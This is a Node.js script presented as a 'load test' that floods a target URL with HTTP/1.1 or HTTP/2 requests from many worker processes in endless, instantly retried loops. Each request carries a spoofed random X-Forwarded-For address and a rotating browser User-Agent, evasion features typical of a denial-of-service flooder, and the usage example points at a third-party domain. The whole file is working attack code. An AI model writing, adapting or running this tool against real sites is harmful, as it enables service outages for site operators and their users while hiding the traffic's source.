// ultrafast-hybrid.js
// Usage:
// node ultrafast-hybrid.js <url> <durationSec> <workers> <protocol h1|h2>
// Example: node ultrafast-hybrid.js https://fastyl.net/ 60 20 h1

const cluster = require("cluster");
const os = require("os");
const http = require("http");
const https = require("https");
const http2 = require("http2");
const { URL } = require("url");

// ===== Random Headers / User-Agent =====
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

function randomUserAgent() {
  const agents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${pick(["122.0.0.0","123.0.6312.86","124.0.6367.78"])} Safari/537.36`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS ${pick(["16_0","16_6","17_0","17_1"])} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${pick(["17.0"])} Mobile/15E148 Safari/${pick(["604.1","605.1.15","606.4.5"])}`,
    `Mozilla/5.0 (Linux; Android 14; ${pick(["Pixel 7 Pro","Samsung Galaxy S23","OnePlus 11"])} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${pick(["122.0.0.0","123.0.6312.86","124.0.6367.78"])} Mobile Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${pick(["122.0","123.0","124.0"])} Gecko/20100101 Firefox/${pick(["122.0","123.0","124.0"])}`
  ];
  return pick(agents);
}

function randomIP() {
  return `${Math.floor(Math.random() * 255) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function randomHeaders(proto="h2") {
  const headers = {
    "User-Agent": randomUserAgent(),
    "X-Forwarded-For": randomIP(),
    "Accept": pick(["*/*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"]),
    "Accept-Language": pick(["en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9,en;q=0.8"]),
    "Accept-Encoding": pick(["gzip, deflate, br","gzip, br"]),
    "Upgrade-Insecure-Requests": "1",
  };
  if(proto === "h1") headers["Connection"] = "keep-alive";
  return headers;
}

// ===== Master Process =====
if(cluster.isPrimary) {
  const [,, url, duration, workers, protocol] = process.argv;
  if(!url || !duration) {
    console.log("Usage: node ultrafast-hybrid.js <url> <durationSec> <workers> <protocol h1|h2>");
    process.exit(1);
  }

  const dur = parseInt(duration);
  const numWorkers = parseInt(workers) || os.cpus().length;
  const proto = protocol || "h1";

  console.log(`🚀 Ultra-Fast Hybrid Load Test
Target: ${url}
Duration: ${dur}s
Workers: ${numWorkers}
Protocol: ${proto}`);

  let totalRequests = 0, totalBytes = 0;

  for(let i = 0; i < numWorkers; i++) {
    const worker = cluster.fork({ URL: url, DURATION: dur, PROTO: proto });
    worker.on("message", msg => {
      totalRequests += msg.requests || 0;
      totalBytes += msg.bytes || 0;
    });
  }

  setTimeout(() => {
    for(const id in cluster.workers) cluster.workers[id].kill();
    console.log("\n=== Results ===");
    console.log("✅ Total Requests:", totalRequests);
    console.log("📦 Total Data:", (totalBytes / 1024 / 1024).toFixed(2), "MB");
    console.log("⚡ Req/sec:", (totalRequests / dur).toFixed(2));
    console.log("⚡ MB/sec:", ((totalBytes / dur) / 1024 / 1024).toFixed(2));
    process.exit(0);
  }, dur * 1000 + 1000);

} else {
  // ===== Worker Process =====
  const target = new URL(process.env.URL);
  const dur = parseInt(process.env.DURATION);
  const proto = process.env.PROTO;

  let requests = 0, bytes = 0;

  if(proto === "h1") {
    const mod = target.protocol === "https:" ? https : http;
    const agent = new mod.Agent({ keepAlive: true, maxSockets: 1000 });

    function fire() {
      const start = Date.now();
      const req = mod.request({
        hostname: target.hostname,
        port: target.port,
        path: target.pathname,
        method: "GET",
        headers: randomHeaders("h1"),
        agent: agent
      }, res => {
        res.on("data", chunk => { bytes += chunk.length; });
        res.on("end", () => {
          requests++;
          fire();
        });
      });
      req.on("error", () => fire()); // retry on error
      req.end();
    }

    for(let i = 0; i < 100; i++) fire(); // parallel loops
  } else if(proto === "h2") {
    const SESSIONS_PER_WORKER = 3;       // multiple HTTP/2 clients
    const STREAMS_PER_SESSION = 20;      // concurrent streams per client

    const clients = [];
    for(let s = 0; s < SESSIONS_PER_WORKER; s++) {
      const client = http2.connect(target.origin);
      client.on("error", () => {}); // ignore connection-level errors
      clients.push(client);
    }

    function fireH2(client) {
      const req = client.request({ ":path": target.pathname, ...randomHeaders("h2") });
      req.on("data", chunk => { bytes += chunk.length; });
      req.on("end", () => {
        requests++;
        fireH2(client);
      });
      req.on("error", () => setTimeout(() => fireH2(client), 10)); // retry after 10ms
      req.end();
    }

    clients.forEach(client => {
      for(let i = 0; i < STREAMS_PER_SESSION; i++) fireH2(client);
    });

    setTimeout(() => clients.forEach(c => c.close()), dur * 1000);
  }

  setTimeout(() => {
    process.send({ requests, bytes });
    process.exit(0);
  }, dur * 1000);
}
